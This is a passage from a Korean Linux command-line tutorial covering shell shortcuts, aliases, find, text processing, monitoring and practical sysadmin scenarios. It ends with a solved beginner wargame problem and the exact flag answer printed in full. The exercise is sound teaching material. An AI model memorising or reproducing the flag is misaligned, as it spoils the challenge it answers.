ls *.txt            # 먼저 무엇이 삭제될지 확인
```

**5. 절대 경로 vs 상대 경로**
```bash
# 현재 위치를 항상 확인
pwd

# 중요한 작업은 절대 경로 사용
rm -rf /home/user/old_project     # 명확함
# rm -rf ../../../old_project     # 위험할 수 있음
```

--------------------------------------------------------------------------------------------

## 유용한 팁과 트릭

### 명령어 히스토리

```bash
history                 # 명령어 이력 보기
!100                    # 100번째 명령어 실행
!!                      # 마지막 명령어 실행
!grep                   # grep으로 시작하는 마지막 명령어 실행
Ctrl + R                # 명령어 이력 검색 (interactive)
```

### 단축키

**터미널 조작**
```
Ctrl + C        # 현재 실행 중인 프로세스 중단
Ctrl + Z        # 현재 프로세스 일시 중지
Ctrl + D        # 로그아웃 / EOF 전송
Ctrl + L        # 화면 지우기 (clear 명령어와 동일)
```

**커서 이동**
```
Ctrl + A        # 줄의 시작으로
Ctrl + E        # 줄의 끝으로
Ctrl + U        # 커서부터 앞쪽 전체 삭제
Ctrl + K        # 커서부터 뒷쪽 전체 삭제
Ctrl + W        # 커서 앞의 단어 삭제
```

**Tab 자동완성**
```
Tab             # 파일명/명령어 자동완성
Tab Tab         # 가능한 모든 옵션 표시
```

### 별칭(Alias) 설정

자주 사용하는 명령어를 짧게 만들 수 있습니다.

```bash
# 임시 별칭 (현재 세션만)
alias ll='ls -alh'
alias ..='cd ..'
alias ...='cd ../..'
alias grep='grep --color=auto'

# 영구 별칭 (~/.bashrc 또는 ~/.zshrc에 추가)
echo "alias ll='ls -alh'" >> ~/.bashrc
source ~/.bashrc
```

### 환경 변수

```bash
echo $PATH          # PATH 환경 변수 확인
echo $HOME          # 홈 디렉토리
echo $USER          # 현재 사용자
echo $SHELL         # 현재 셸

# 환경 변수 설정
export MY_VAR="value"
echo $MY_VAR

# 영구 설정 (~/.bashrc에 추가)
echo 'export PATH=$PATH:/my/custom/path' >> ~/.bashrc
```

### 작업 관리

```bash
command &           # 백그라운드에서 실행
jobs                # 백그라운드 작업 목록
fg %1               # 1번 작업을 포그라운드로
bg %1               # 1번 작업을 백그라운드로
nohup command &     # 로그아웃 후에도 계속 실행
```

### 파일 찾기 고급

```bash
# 최근 수정된 파일 찾기
find . -mtime -7                # 7일 이내
find . -mmin -60                # 60분 이내

# 파일 크기로 찾기
find . -size +100M              # 100MB 이상
find . -size -1k                # 1KB 이하

# 찾은 파일에 명령 실행
find . -name "*.log" -exec rm {} \;
find . -type f -name "*.txt" -exec grep "error" {} +

# 여러 조건 조합
find . -type f -name "*.py" -size +1M -mtime -30
```

### 텍스트 처리

```bash
# 줄 번호 표시
cat -n file.txt
nl file.txt

# 중복 제거
sort file.txt | uniq
sort -u file.txt

# 컬럼 추출
awk '{print $1}' file.txt       # 첫 번째 컬럼
cut -d':' -f1 /etc/passwd       # : 구분자로 첫 번째 필드

# 문자열 치환
sed 's/old/new/' file.txt       # 첫 번째 매치만
sed 's/old/new/g' file.txt      # 모든 매치
sed -i 's/old/new/g' file.txt   # 파일 직접 수정
```

### 시스템 모니터링

```bash
# 디스크 I/O
iostat
iotop               # 실시간 I/O 모니터링

# 네트워크
netstat -tuln       # 리스닝 포트
ss -tuln            # 현대적인 대체
lsof -i :80         # 특정 포트 사용 프로세스

# 메모리
free -h             # 메모리 사용량
vmstat              # 가상 메모리 통계
```

--------------------------------------------------------------------------------------------

## 실전 시나리오

### 시나리오 1: 디스크 공간 확보

```bash
# 1. 디스크 사용량 확인
df -h

# 2. 큰 파일/디렉토리 찾기
du -sh /* | sort -h

# 3. 특정 디렉토리 상세 분석
du -h --max-depth=1 /home | sort -h

# 4. 100MB 이상 파일 찾기
find / -type f -size +100M 2>/dev/null

# 5. 오래된 로그 파일 정리
find /var/log -name "*.log" -mtime +30 -delete

# 6. 임시 파일 정리
sudo apt clean              # 패키지 캐시
rm -rf ~/.cache/*          # 사용자 캐시
```

### 시나리오 2: 시스템 느림 진단

```bash
# 1. CPU 사용률 확인
top

# 2. CPU 사용 상위 프로세스
ps aux --sort=-%cpu | head

# 3. 메모리 사용 상위 프로세스
ps aux --sort=-%mem | head

# 4. 디스크 I/O 확인
iostat -x 1

# 5. 특정 프로세스 종료
kill -9 [PID]
```

### 시나리오 3: 로그 분석

```bash
# 1. 최근 에러 확인
tail -f /var/log/nginx/error.log

# 2. 특정 시간대 로그
grep "2026-01-12 14:" /var/log/nginx/access.log

# 3. 404 에러 개수
grep "404" /var/log/nginx/access.log | wc -l

# 4. IP별 요청 횟수
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn

# 5. 가장 많이 요청된 URL
awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head

# 6. 에러 로그를 파일로 저장
grep "error" /var/log/nginx/error.log > errors_$(date +%Y%m%d).log
```

### 시나리오 4: 백업 및 복원

```bash
# 1. 압축 백업 생성
tar -czf backup_$(date +%Y%m%d_%H%M%S).tar.gz /path/to/project

# 2. 원격 서버로 전송
scp backup_*.tar.gz user@remote:/backup/

# 3. 백업에서 복원
tar -xzf backup_20260112_143000.tar.gz

# 4. 특정 파일만 추출
tar -xzf backup.tar.gz path/to/specific/file

# 5. 증분 백업 (rsync 사용)
rsync -avz --delete /source/ /backup/

# 6. 원격 동기화
rsync -avz -e ssh /local/path/ user@remote:/remote/path/
```

### 시나리오 5: 권한 문제 해결

```bash
# 1. 파일 권한 확인
ls -l /var/www/html/

# 2. 소유자 확인
stat /var/www/html/index.html

# 3. 웹 서버 사용자 확인 (nginx 예시)
ps aux | grep nginx

# 4. 소유자 변경
sudo chown -R www-data:www-data /var/www/html/

# 5. 권한 설정
sudo find /var/www/html -type d -exec chmod 755 {} \;
sudo find /var/www/html -type f -exec chmod 644 {} \;

# 6. 특수 권한이 필요한 경우
sudo chmod u+s /usr/bin/special_program
```

--------------------------------------------------------------------------------------------

## 실전 문제 풀이

```bash
ls                              # 현재 디렉토리 파일 확인
cat hint.txt                    # 힌트 파일 읽기
cat /dream/hack/hello/flag.txt  # 힌트에 나온 경로의 플래그 읽기
cat app.py                      # 추가 파일 확인
cat ./dream/hack/hello/f*ag.txt # 와일드카드로 플래그 파일 읽기
```

{{< details "정답(Flag) 보기" >}}
DH{671ce26c70829e716fae26c7c71a33823feb479f2562891f64605bf68f60ae54}
{{< /details >}}

--------------------------------------------------------------------------------------------